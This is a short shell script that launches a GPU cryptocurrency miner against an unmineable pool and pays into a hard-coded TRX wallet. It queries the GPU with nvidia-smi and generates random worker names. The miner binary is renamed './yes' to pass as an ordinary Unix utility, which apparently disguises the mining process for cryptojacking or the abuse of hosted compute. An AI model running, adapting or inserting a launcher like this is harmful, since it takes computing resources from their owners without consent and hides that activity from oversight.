POOL=rx-us.unmineable.com:3333
WALLET=TRX:TAB1uzLj8sfSjFEZYVGgTwgUgvmvqYNNAo
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo WYtB9mjH-$(shuf -i 1911-856836 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
